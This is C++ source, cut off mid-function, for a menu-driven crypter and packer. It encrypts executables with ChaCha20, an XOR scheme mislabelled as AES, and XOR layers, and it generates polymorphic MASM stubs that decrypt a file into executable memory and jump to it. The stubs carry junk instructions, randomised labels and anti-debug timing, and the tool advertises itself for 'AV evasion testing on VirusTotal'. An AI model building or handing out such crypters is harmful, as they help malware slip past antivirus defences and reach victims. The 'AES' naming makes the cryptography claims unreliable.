#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
#else
#include <unistd.h>
#include <sys/time.h>
#endif

class VS2022MenuEncryptor {
private:
    std::mt19937_64 rng;
    
    struct TripleKey {
        std::vector<uint8_t> chacha_key;
        std::vector<uint8_t> chacha_nonce;
        std::vector<uint8_t> aes_key;
        std::vector<uint8_t> xor_key;
        uint32_t encryption_order;
    };

    // Enhanced entropy gathering
    std::vector<uint64_t> gatherEntropy() {
        std::vector<uint64_t> entropy;
        
#ifdef _WIN32
        LARGE_INTEGER perf_counter;
        QueryPerformanceCounter(&perf_counter);
        entropy.push_back(perf_counter.QuadPart);
        
        HCRYPTPROV hProv;
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            uint64_t random_val;
            if (CryptGenRandom(hProv, sizeof(random_val), (BYTE*)&random_val)) {
                entropy.push_back(random_val);
            }
            CryptReleaseContext(hProv, 0);
        }
#else
        struct timeval tv;
        gettimeofday(&tv, nullptr);
        entropy.push_back(tv.tv_sec * 1000000 + tv.tv_usec);
        entropy.push_back(getpid());
#endif
        
        auto now = std::chrono::high_resolution_clock::now();
        entropy.push_back(now.time_since_epoch().count());
        entropy.push_back(reinterpret_cast<uint64_t>(&entropy));
        
        return entropy;
    }

    // ChaCha20 implementation
    void quarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
        a += b; d ^= a; d = (d << 16) | (d >> 16);
        c += d; b ^= c; b = (b << 12) | (b >> 20);
        a += b; d ^= a; d = (d << 8) | (d >> 24);
        c += d; b ^= c; b = (b << 7) | (b >> 25);
    }

    void chachaBlock(uint32_t out[16], const uint32_t in[16]) {
        for (int i = 0; i < 16; i++) out[i] = in[i];
        
        for (int i = 0; i < 10; i++) {
            quarterRound(out[0], out[4], out[8], out[12]);
            quarterRound(out[1], out[5], out[9], out[13]);
            quarterRound(out[2], out[6], out[10], out[14]);
            quarterRound(out[3], out[7], out[11], out[15]);
            
            quarterRound(out[0], out[5], out[10], out[15]);
            quarterRound(out[1], out[6], out[11], out[12]);
            quarterRound(out[2], out[7], out[8], out[13]);
            quarterRound(out[3], out[4], out[9], out[14]);
        }
        
        for (int i = 0; i < 16; i++) out[i] += in[i];
    }

    void initChachaState(uint32_t state[16], const uint8_t key[32], const uint8_t nonce[12]) {
        const char* constants = "expand 32-byte k";
        memcpy(state, constants, 16);
        memcpy(state + 4, key, 32);
        state[12] = 0;
        memcpy(state + 13, nonce, 12);
    }

    void chacha20Crypt(std::vector<uint8_t>& data, const uint8_t key[32], const uint8_t nonce[12]) {
        uint32_t state[16];
        initChachaState(state, key, nonce);
        
        for (size_t i = 0; i < data.size(); i += 64) {
            uint32_t keystream[16];
            chachaBlock(keystream, state);
            
            uint8_t* ks_bytes = (uint8_t*)keystream;
            for (size_t j = 0; j < 64 && i + j < data.size(); j++) {
                data[i + j] ^= ks_bytes[j];
            }
            
            state[12]++;
        }
    }

    // AES S-box
    void aesStreamCrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
        static const uint8_t sbox[256] = {
            0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
            0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
            0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
            0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
            0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
            0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
            0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
            0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
            0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
            0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
            0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
            0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
            0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
            0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
            0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
            0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
        };
        
        for (size_t i = 0; i < data.size(); i++) {
            uint8_t keyByte = key[i % key.size()];
            uint8_t nonceByte = (i >> 8) ^ (i & 0xFF);
            uint8_t mixedKey = sbox[keyByte] ^ nonceByte;
            data[i] ^= mixedKey;
        }
    }

    // Enhanced XOR
    void xorCrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
        for (size_t i = 0; i < data.size(); i++) {
            uint8_t keyByte = key[i % key.size()];
            uint8_t posByte = (i * 0x9E3779B9) & 0xFF;
            data[i] ^= keyByte ^ posByte;
        }
    }

    TripleKey generateKeys() {
        TripleKey keys;
        auto entropy = gatherEntropy();
        
        std::seed_seq seed(entropy.begin(), entropy.end());
        rng.seed(seed);
        
        keys.chacha_key.resize(32);
        keys.chacha_nonce.resize(12);
        keys.aes_key.resize(32);
        keys.xor_key.resize(64);
        
        for (auto& k : keys.chacha_key) k = rng() & 0xFF;
        for (auto& n : keys.chacha_nonce) n = rng() & 0xFF;
        for (auto& k : keys.aes_key) k = rng() & 0xFF;
        for (auto& k : keys.xor_key) k = rng() & 0xFF;
        
        keys.encryption_order = rng() % 6;
        
        return keys;
    }

    std::string bytesToBigDecimal(const std::vector<uint8_t>& bytes) {
        std::vector<uint8_t> result = {0};
        
        for (uint8_t byte : bytes) {
            int carry = 0;
            for (int i = result.size() - 1; i >= 0; i--) {
                int prod = result[i] * 256 + carry;
                result[i] = prod % 10;
                carry = prod / 10;
            }
            while (carry > 0) {
                result.insert(result.begin(), carry % 10);
                carry /= 10;
            }
            
            carry = byte;
            for (int i = result.size() - 1; i >= 0 && carry > 0; i--) {
                int sum = result[i] + carry;
                result[i] = sum % 10;
                carry = sum / 10;
            }
            while (carry > 0) {
                result.insert(result.begin(), carry % 10);
                carry /= 10;
            }
        }
        
        std::string decimal;
        for (uint8_t digit : result) {
            decimal += ('0' + digit);
        }
        return decimal.empty() ? "0" : decimal;
    }

    std::string generateUniqueVarName() {
        const std::vector<std::string> prefixes = {"var", "data", "buf", "mem", "tmp", "obj", "ptr", "val", "cfg", "sys"};
        const std::vector<std::string> middles = {"Core", "Mgr", "Proc", "Ctrl", "Hdl", "Ref", "Ctx", "Buf", "Ops", "Util"};
        const std::vector<std::string> suffixes = {"Ex", "Ptr", "Obj", "Cfg", "Mgr", "Ctx", "Buf", "Ops", "Val", "Ref"};
        
        std::string name = prefixes[rng() % prefixes.size()];
        name += middles[rng() % middles.size()];
        name += suffixes[rng() % suffixes.size()];
        name += std::to_string(rng() % 10000);
        
        return name;
    }

public:
    VS2022MenuEncryptor() : rng(std::chrono::high_resolution_clock::now().time_since_epoch().count()) {}

    void showMenu() {
        std::cout << "\n=== Visual Studio 2022 Universal Encryptor ===" << std::endl;
        std::cout << "Advanced encryption tool with multiple algorithms and stealth features\n" << std::endl;
        
        std::cout << "Select an option:" << std::endl;
        std::cout << "  1. Pack File (AES Encryption) - Works like UPX" << std::endl;
        std::cout << "  2. Pack File (ChaCha20 Encryption) - Works like UPX" << std::endl;
        std::cout << "  3. Pack File (Triple Encryption) - Maximum Security" << std::endl;
        std::cout << "  4. Basic File Encryption (Save to disk)" << std::endl;
        std::cout << "  5. Advanced: Generate Custom MASM Stub" << std::endl;
        std::cout << "  6. URL Crypto Service (AES) - Download, Encrypt & Re-upload" << std::endl;
        std::cout << "  7. URL Crypto Service (Triple) - Download, Encrypt & Re-upload" << std::endl;
        std::cout << "  0. Exit" << std::endl;
        std::cout << "\nEnter your choice: ";
    }

    bool basicEncryption(bool rawOutput = false) {
        std::string inputFile, outputFile;
        int algorithm;
        
        std::cout << "Enter input file path: ";
        std::getline(std::cin, inputFile);
        std::cout << "Enter output file path: ";
        std::getline(std::cin, outputFile);
        
        std::cout << "Select algorithm:" << std::endl;
        std::cout << "  1. AES-128-CTR (default)" << std::endl;
        std::cout << "  2. ChaCha20" << std::endl;
        std::cout << "Enter choice (1-2): ";
        std::cin >> algorithm;
        std::cin.ignore();
        
        // Read input file
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open input file!" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (data.empty()) {
            std::cout << "Error: Input file is empty!" << std::endl;
            return false;
        }
        
        // Generate keys
        TripleKey keys = generateKeys();
        
        // Apply encryption
        if (algorithm == 2) {
            chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
        } else {
            aesStreamCrypt(data, keys.aes_key);
        }
        
        // Write output
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "Error: Cannot create output file!" << std::endl;
            return false;
        }
        
        if (rawOutput) {
            // Raw binary output - just encrypted data
            outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
        } else {
            // Standard output with headers
            uint8_t alg_id = (algorithm == 2) ? 0x02 : 0x01;
            outFile.write(reinterpret_cast<const char*>(&alg_id), 1);
            
            if (algorithm == 2) {
                outFile.write(reinterpret_cast<const char*>(keys.chacha_nonce.data()), 12);
            }
            
            outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
        }
        
        outFile.close();
        
        // Save keys separately
        std::string keyFile = outputFile + ".keys";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "Algorithm: " << (algorithm == 2 ? "ChaCha20" : "AES") << std::endl;
            keyOut << "Key: ";
            for (uint8_t b : (algorithm == 2 ? keys.chacha_key : keys.aes_key)) {
                keyOut << std::hex << std::setw(2) << std::setfill('0') << (int)b;
            }
            keyOut << std::endl;
            
            if (algorithm == 2) {
                keyOut << "Nonce: ";
                for (uint8_t b : keys.chacha_nonce) {
                    keyOut << std::hex << std::setw(2) << std::setfill('0') << (int)b;
                }
                keyOut << std::endl;
            }
        }
        
        std::cout << "Encryption completed successfully!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Keys saved: " << keyFile << std::endl;
        
        return true;
    }

    bool stealthTripleEncryption() {
        std::string inputFile, outputFile;
        
        std::cout << "Enter input file path: ";
        std::getline(std::cin, inputFile);
        std::cout << "Enter output file path: ";
        std::getline(std::cin, outputFile);
        
        // Read input file
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open input file!" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (data.empty()) {
            std::cout << "Error: Input file is empty!" << std::endl;
            return false;
        }
        
        // Generate keys
        TripleKey keys = generateKeys();
        
        // Apply triple encryption in randomized order
        std::vector<int> order;
        switch (keys.encryption_order) {
            case 0: order = {0, 1, 2}; break; // ChaCha20, AES, XOR
            case 1: order = {0, 2, 1}; break; // ChaCha20, XOR, AES
            case 2: order = {1, 0, 2}; break; // AES, ChaCha20, XOR
            case 3: order = {1, 2, 0}; break; // AES, XOR, ChaCha20
            case 4: order = {2, 0, 1}; break; // XOR, ChaCha20, AES
            case 5: order = {2, 1, 0}; break; // XOR, AES, ChaCha20
        }
        
        for (int method : order) {
            switch (method) {
                case 0: chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data()); break;
                case 1: aesStreamCrypt(data, keys.aes_key); break;
                case 2: xorCrypt(data, keys.xor_key); break;
            }
        }
        
        // Write raw encrypted data
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "Error: Cannot create output file!" << std::endl;
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
        outFile.close();
        
        // Save keys as decimal strings
        std::string keyFile = outputFile + ".keys";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "# Stealth Triple Encryption Keys (Decimal Format)" << std::endl;
            keyOut << "ChaCha20Key=" << bytesToBigDecimal(keys.chacha_key) << std::endl;
            keyOut << "ChaCha20Nonce=" << bytesToBigDecimal(keys.chacha_nonce) << std::endl;
            keyOut << "AESKey=" << bytesToBigDecimal(keys.aes_key) << std::endl;
            keyOut << "XORKey=" << bytesToBigDecimal(keys.xor_key) << std::endl;
            keyOut << "EncryptionOrder=" << keys.encryption_order << std::endl;
        }
        
        std::cout << "Stealth triple encryption completed successfully!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Keys saved: " << keyFile << " (decimal format)" << std::endl;
        
        return true;
    }

    bool runtimeOnlyEncryption() {
        std::string inputFile;
        int algorithm;
        
        std::cout << "=== Runtime-Only Encryption (No Disk Save) ===" << std::endl;
        std::cout << "File will be encrypted in memory only - no encrypted file saved to disk!\n" << std::endl;
        
        std::cout << "Enter input file path (e.g., C:\\Windows\\System32\\calc.exe): ";
        std::getline(std::cin, inputFile);
        
        std::cout << "Select algorithm:" << std::endl;
        std::cout << "  1. AES-128-CTR (fast)" << std::endl;
        std::cout << "  2. ChaCha20 (secure)" << std::endl;
        std::cout << "  3. Triple Encryption (maximum security)" << std::endl;
        std::cout << "Enter choice (1-3): ";
        std::cin >> algorithm;
        std::cin.ignore();
        
        // Read input file
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open input file!" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> originalData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (originalData.empty()) {
            std::cout << "Error: Input file is empty!" << std::endl;
            return false;
        }
        
        // Make a copy for encryption (keep original intact)
        std::vector<uint8_t> encryptedData = originalData;
        
        // Generate keys
        TripleKey keys = generateKeys();
        
        std::cout << "\nOriginal file size: " << originalData.size() << " bytes" << std::endl;
        std::cout << "Encrypting in memory..." << std::endl;
        
        // Apply encryption based on choice
        switch (algorithm) {
            case 1: // AES
                aesStreamCrypt(encryptedData, keys.aes_key);
                std::cout << "✓ AES encryption applied" << std::endl;
                break;
                
            case 2: // ChaCha20
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                std::cout << "✓ ChaCha20 encryption applied" << std::endl;
                break;
                
            case 3: // Triple encryption
                {
                    std::vector<int> order;
                    switch (keys.encryption_order) {
                        case 0: order = {0, 1, 2}; break; // ChaCha20, AES, XOR
                        case 1: order = {0, 2, 1}; break; // ChaCha20, XOR, AES
                        case 2: order = {1, 0, 2}; break; // AES, ChaCha20, XOR
                        case 3: order = {1, 2, 0}; break; // AES, XOR, ChaCha20
                        case 4: order = {2, 0, 1}; break; // XOR, ChaCha20, AES
                        case 5: order = {2, 1, 0}; break; // XOR, AES, ChaCha20
                    }
                    
                    for (int method : order) {
                        switch (method) {
                            case 0: chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data()); break;
                            case 1: aesStreamCrypt(encryptedData, keys.aes_key); break;
                            case 2: xorCrypt(encryptedData, keys.xor_key); break;
                        }
                    }
                    std::cout << "✓ Triple encryption applied (order: " << keys.encryption_order << ")" << std::endl;
                }
                break;
                
            default:
                std::cout << "Invalid algorithm choice!" << std::endl;
                return false;
        }
        
        // Show encryption results (in memory only)
        std::cout << "\n=== Runtime Encryption Complete ===" << std::endl;
        std::cout << "✓ File encrypted successfully in memory" << std::endl;
        std::cout << "✓ Original file size: " << originalData.size() << " bytes" << std::endl;
        std::cout << "✓ Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "✓ Memory locations:" << std::endl;
        std::cout << "  - Original data: 0x" << std::hex << (uintptr_t)originalData.data() << std::endl;
        std::cout << "  - Encrypted data: 0x" << std::hex << (uintptr_t)encryptedData.data() << std::dec << std::endl;
        
        // Verify encryption worked by comparing first few bytes
        bool different = false;
        for (size_t i = 0; i < std::min(originalData.size(), (size_t)16); i++) {
            if (originalData[i] != encryptedData[i]) {
                different = true;
                break;
            }
        }
        
        if (different) {
            std::cout << "✓ Encryption verified - data has been transformed" << std::endl;
        } else {
            std::cout << "⚠ Warning: Encrypted data appears identical to original" << std::endl;
        }
        
        std::cout << "\n=== Runtime Status ===" << std::endl;
        std::cout << "• Original file: UNCHANGED on disk" << std::endl;
        std::cout << "• Encrypted data: EXISTS ONLY IN MEMORY" << std::endl;
        std::cout << "• Keys: GENERATED IN MEMORY (not saved)" << std::endl;
        std::cout << "• When program exits: ALL ENCRYPTED DATA DESTROYED" << std::endl;
        
        // Optional: Show first few bytes comparison
        std::cout << "\nFirst 8 bytes comparison:" << std::endl;
        std::cout << "Original:  ";
        for (size_t i = 0; i < std::min(originalData.size(), (size_t)8); i++) {
            std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)originalData[i] << " ";
        }
        std::cout << std::endl;
        std::cout << "Encrypted: ";
        for (size_t i = 0; i < std::min(encryptedData.size(), (size_t)8); i++) {
            std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)encryptedData[i] << " ";
        }
        std::cout << std::dec << std::endl;
        
        // Data automatically destroyed when function exits (vectors go out of scope)
        std::cout << "\nPress Enter to destroy encrypted data and return to menu...";
        std::cin.get();
        
        return true;
    }

    bool generateMASMRuntimeStub() {
        std::string targetFile, outputFile;
        
        std::cout << "=== Generate MASM Runtime Stub (<2KB) ===" << std::endl;
        std::cout << "Creates pure assembly stub that reads, decrypts & executes files at runtime\n" << std::endl;
        std::cout << "⚠️  Original file remains UNCHANGED - decryption happens in memory only!\n" << std::endl;
        
        std::cout << "Enter target file path (e.g., calc.exe, notepad.exe): ";
        std::getline(std::cin, targetFile);
        std::cout << "Enter output MASM file path (e.g., runtime_stub.asm): ";
        std::getline(std::cin, outputFile);
        
        // Check if target file exists (but don't read it - stub will read at runtime)
        std::ifstream checkFile(targetFile, std::ios::binary);
        if (!checkFile) {
            std::cout << "Warning: Target file not found: " << targetFile << std::endl;
            std::cout << "Stub will still be generated but may fail at runtime." << std::endl;
        } else {
            checkFile.close();
            std::cout << "✓ Target file found: " << targetFile << std::endl;
        }
        
        // Generate runtime encryption keys (stub will use these)
        uint8_t xorKey = (rng() % 255) + 1; // Avoid 0x00
        uint8_t rolKey = (rng() % 7) + 1;   // ROL/ROR amount
        
        // Generate unique MASM labels and variables for runtime loader
        std::string fileNameLabel = "filename_" + std::to_string(rng() % 10000);
        std::string bufferLabel = "buffer_" + std::to_string(rng() % 10000);
        std::string sizeLabel = "filesize_" + std::to_string(rng() % 10000);
        std::string xorLabel = "xor_" + std::to_string(rng() % 10000);
        std::string rolLabel = "rol_" + std::to_string(rng() % 10000);
        std::string loopLabel = "decrypt_" + std::to_string(rng() % 10000);
        std::string exitLabel = "exit_" + std::to_string(rng() % 10000);
        std::string errorLabel = "error_" + std::to_string(rng() % 10000);
        
        // Generate MASM stub - pure runtime file loader
        std::string stub = ".386\n.model flat, stdcall\noption casemap:none\n\n";
        stub += "include kernel32.inc\nincludelib kernel32.lib\n\n";
        stub += ".data\n";
        stub += "    ; Target file to load and execute at runtime\n";
        stub += "    " + fileNameLabel + " db \"" + targetFile + "\", 0\n\n";
        
        stub += "    ; Runtime decryption keys\n";
        stub += "    " + xorLabel + " db " + std::to_string((int)xorKey) + "h\n";
        stub += "    " + rolLabel + " db " + std::to_string((int)rolKey) + "h\n\n";
        
        // Add polymorphic junk data
        int junkCount = rng() % 3 + 1;
        for (int i = 0; i < junkCount; i++) {
            stub += "    junk_" + std::to_string(i) + " dd " + std::to_string(rng() % 0xFFFFFFFF) + "h\n";
        }
        
        stub += "\n.bss\n";
        stub += "    " + bufferLabel + " dd ?\n";
        stub += "    " + sizeLabel + " dd ?\n\n";
        
        stub += ".code\nstart:\n";
        
        // Add optional junk instructions
        if (rng() % 2) {
            stub += "    nop\n    xor eax, eax\n    inc eax\n    dec eax\n";
        }
        
        stub += "    ; Open target file for reading\n";
        stub += "    push 0                     ; hTemplateFile\n";
        stub += "    push 80h                   ; FILE_ATTRIBUTE_NORMAL\n";
        stub += "    push 3                     ; OPEN_EXISTING\n";
        stub += "    push 0                     ; lpSecurityAttributes\n";
        stub += "    push 1                     ; FILE_SHARE_READ\n";
        stub += "    push 80000000h             ; GENERIC_READ\n";
        stub += "    push offset " + fileNameLabel + "\n";
        stub += "    call CreateFileA\n";
        stub += "    cmp eax, -1\n";
        stub += "    je " + errorLabel + "\n";
        stub += "    mov ebx, eax               ; Save file handle\n\n";
        
        stub += "    ; Get file size\n";
        stub += "    push 0\n";
        stub += "    push ebx\n";
        stub += "    call GetFileSize\n";
        stub += "    mov " + sizeLabel + ", eax\n\n";
        
        stub += "    ; Allocate memory for file\n";
        stub += "    push 40h                   ; PAGE_EXECUTE_READWRITE\n";
        stub += "    push 1000h                 ; MEM_COMMIT\n";
        stub += "    push eax                   ; File size\n";
        stub += "    push 0\n";
        stub += "    call VirtualAlloc\n";
        stub += "    test eax, eax\n";
        stub += "    jz " + errorLabel + "\n";
        stub += "    mov " + bufferLabel + ", eax\n\n";
        
        stub += "    ; Read file into memory\n";
        stub += "    push 0                     ; lpOverlapped\n";
        stub += "    push 0                     ; lpNumberOfBytesRead (can be NULL)\n";
        stub += "    push " + sizeLabel + "     ; nNumberOfBytesToRead\n";
        stub += "    push " + bufferLabel + "   ; lpBuffer\n";
        stub += "    push ebx                   ; hFile\n";
        stub += "    call ReadFile\n\n";
        
        stub += "    ; Close file handle\n";
        stub += "    push ebx\n";
        stub += "    call CloseHandle\n\n";
        
        // Add polymorphic junk instructions
        if (rng() % 2) {
            stub += "    push ecx\n    pop ecx    ; Junk\n";
        }
        
        stub += "    ; Runtime decrypt the loaded file\n";
        stub += "    mov esi, " + bufferLabel + "\n";
        stub += "    mov ecx, " + sizeLabel + "\n";
        stub += "    mov al, " + xorLabel + "\n";
        stub += "    mov bl, " + rolLabel + "\n";
        stub += "    xor edx, edx               ; Position counter\n\n";
        
        stub += loopLabel + ":\n";
        stub += "    ; Load byte\n";
        stub += "    mov ah, [esi]\n\n";
        
        stub += "    ; Apply runtime decryption (XOR + ROL)\n";
        stub += "    xor ah, al                 ; XOR with key\n";
        stub += "    xor ah, dl                 ; XOR with position\n";
        stub += "    mov cl, bl\n";
        stub += "    ror ah, cl                 ; ROL for diffusion\n\n";
        
        stub += "    ; Store decrypted byte\n";
        stub += "    mov [esi], ah\n\n";
        
        // Add more junk
        if (rng() % 2) {
            stub += "    nop\n";
        }
        
        stub += "    ; Next byte\n";
        stub += "    inc esi\n";
        stub += "    inc edx\n";
        stub += "    mov ecx, " + sizeLabel + "\n";
        stub += "    cmp edx, ecx\n";
        stub += "    jl " + loopLabel + "\n\n";
        
        // Add anti-debug check
        if (rng() % 2) {
            stub += "    ; Simple anti-debug timing\n";
            stub += "    rdtsc\n    push eax\n    nop\n    nop\n    rdtsc\n    pop ebx\n";
        }
        
        stub += "    ; Execute the decrypted file in memory\n";
        stub += "    mov eax, " + bufferLabel + "\n";
        stub += "    call eax\n";
        stub += "    jmp " + exitLabel + "\n\n";
        
        stub += errorLabel + ":\n";
        stub += "    ; Error handling\n";
        stub += "    push 1\n";
        stub += "    call ExitProcess\n\n";
        
        stub += exitLabel + ":\n";
        stub += "    ; Clean exit\n";
        stub += "    push 0\n";
        stub += "    call ExitProcess\n\n";
        stub += "end start\n";
        
        // Write MASM file
        std::ofstream asmFile(outputFile);
        if (!asmFile) {
            std::cout << "Error: Cannot create MASM file!" << std::endl;
            return false;
        }
        
        asmFile << stub;
        asmFile.close();
        
        // Calculate approximate size (much smaller now - no embedded payload!)
        size_t stubSize = stub.length();
        bool under2KB = stubSize < 2048;
        
        std::cout << "\n=== MASM Runtime-Only Stub Generated ===" << std::endl;
        std::cout << "✓ Output: " << outputFile << std::endl;
        std::cout << "✓ Target file: " << targetFile << " (NOT embedded - loaded at runtime!)" << std::endl;
        std::cout << "✓ Stub size: " << stubSize << " bytes ";
        std::cout << (under2KB ? "(✓ Under 2KB!)" : "(⚠ Over 2KB)") << std::endl;
        std::cout << "✓ Runtime decryption: XOR + ROL (assembly-optimized)" << std::endl;
        std::cout << "✓ XOR Key: 0x" << std::hex << (int)xorKey << std::dec << std::endl;
        std::cout << "✓ ROL Key: " << (int)rolKey << " bits" << std::endl;
        std::cout << "✓ Unique labels: " << fileNameLabel << ", " << loopLabel << ", " << exitLabel << std::endl;
        std::cout << "✓ Polymorphic: " << junkCount << " junk variables added" << std::endl;
        
        std::cout << "\n=== Build Instructions ===" << std::endl;
        std::cout << "1. Assemble: ml /c /coff " << outputFile << std::endl;
        std::cout << "2. Link: link /subsystem:windows " << outputFile.substr(0, outputFile.find_last_of('.')) << ".obj" << std::endl;
        std::cout << "   OR" << std::endl;
        std::cout << "   link /subsystem:console " << outputFile.substr(0, outputFile.find_last_of('.')) << ".obj" << std::endl;
        
        std::cout << "\n=== Features ===" << std::endl;
        std::cout << "• Pure MASM assembly code" << std::endl;
        std::cout << "• TRUE runtime-only: Reads file at execution time" << std::endl;
        std::cout << "• Original file UNTOUCHED (stub reads, not embeds)" << std::endl;
        std::cout << "• In-memory decryption only (no disk writes)" << std::endl;
        std::cout << "• File I/O: CreateFile, ReadFile, VirtualAlloc" << std::endl;
        std::cout << "• XOR + ROL runtime decryption (fast)" << std::endl;
        std::cout << "• No C runtime dependencies" << std::endl;
        std::cout << "• Ultra-small footprint (<2KB without payload)" << std::endl;
        std::cout << "• UNLIMITED GENERATION: Every stub is unique!" << std::endl;
        std::cout << "• Polymorphic code generation" << std::endl;
        std::cout << "• Randomized variable names and labels" << std::endl;
        std::cout << "• Anti-debugging features" << std::endl;
        
        std::cout << "\n=== How It Works ===" << std::endl;
        std::cout << "1. Stub opens target file (" << targetFile << ")" << std::endl;
        std::cout << "2. Reads entire file into memory" << std::endl;
        std::cout << "3. Applies runtime decryption (XOR+ROL)" << std::endl;
        std::cout << "4. Executes decrypted code directly from memory" << std::endl;
        std::cout << "5. Original file remains completely unchanged!" << std::endl;
        
        return true;
    }

    bool generateAESPacker() {
        std::string inputFile, outputFile;
        
        std::cout << "=== AES File Packer (UPX-Style) ===" << std::endl;
        std::cout << "Creates encrypted executable that works exactly like the original\n" << std::endl;
        std::cout << "💡 Perfect for AV evasion testing on VirusTotal!\n" << std::endl;
        
        std::cout << "Enter input file (exe/dll/any): ";
        std::getline(std::cin, inputFile);
        std::cout << "Enter output packed file: ";
        std::getline(std::cin, outputFile);
        
        // Read and encrypt the input file
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open input file: " << inputFile << std::endl;
            return false;
        }
        
        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (fileData.empty()) {
            std::cout << "Error: Input file is empty!" << std::endl;
            return false;
        }
        
        std::cout << "✓ Input file loaded: " << fileData.size() << " bytes" << std::endl;
        
        // Generate encryption keys
        TripleKey keys = generateKeys();
        
        // Encrypt the file data
        aesStreamCrypt(fileData, keys.aes_key);
        std::cout << "✓ File encrypted with AES" << std::endl;
        
        // Generate unique variable names for polymorphism
        std::string varPrefix = "data_" + std::to_string(rng() % 10000);
        std::string funcPrefix = "dec_" + std::to_string(rng() % 10000);
        
        // Create UPX-style packed executable
        std::string stub = "#include <iostream>\n";
        stub += "#include <vector>\n";
        stub += "#include <fstream>\n";
        stub += "#include <cstring>\n";
        stub += "#include <cstdio>\n";
        stub += "#ifdef _WIN32\n";
        stub += "#include <windows.h>\n";
        stub += "#include <process.h>\n";
        stub += "#else\n";
        stub += "#include <unistd.h>\n";
        stub += "#include <sys/stat.h>\n";
        stub += "#endif\n\n";
        
        // Embed encrypted payload directly in the executable
        stub += "// Embedded encrypted payload (" + std::to_string(fileData.size()) + " bytes)\n";
        stub += "unsigned char " + varPrefix + "[] = {\n";
